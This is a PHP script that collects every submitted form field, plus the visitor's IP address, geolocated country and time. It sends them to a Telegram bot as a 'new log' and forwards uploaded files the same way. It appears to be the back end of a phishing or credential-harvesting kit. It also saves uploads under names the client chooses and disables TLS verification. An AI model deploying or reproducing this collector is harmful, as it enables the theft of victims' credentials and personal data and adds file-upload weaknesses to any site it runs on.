<?php
require_once './config.php';

function getUserIP()
{
  if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
    return $_SERVER['REMOTE_ADDR'];
  } elseif (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) {

    $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    return trim($ipList[0]);
  }
  return '';
}

function getUserRegion($ip) {
    $response = file_get_contents("https://ipinfo.io/$ip");
    $data = json_decode($response);
    if ($data && isset($data->country)) {
        return $data->country;
    } else {
        return "None";
    }
}

$text = '<strong>`✅ Пришел новый лог`</strong>' . "\n\n";

foreach ($_POST as $key => $val) {
    $text .= $key . ": " . $val . "\n";
}

$text .= "\n🔮IP: " . getUserIP();
$text .= "\n Локация: " . getUserRegion($ip = getUserIP());
$text .= "\n⏱️Время: " . date('d.m.y H:i:s');

$param = [
    "chat_id" => $chat_id,
    "text" => $text
];

$url = "https://api.telegram.org/bot" . $tg_bot_token . "/sendMessage?" . http_build_query($param);

var_dump($text);

file_get_contents($url);

foreach ( $_FILES as $file ) {

    $url = "https://api.telegram.org/bot" . $tg_bot_token . "/sendDocument";

    move_uploaded_file($file['tmp_name'], $file['name']);

    $document = new \CURLFile($file['name']);

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ["chat_id" => $chat_id, "document" => $document]);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

    $out = curl_exec($ch);

    curl_close($ch);

    unlink($file['name']);
}

die('1');
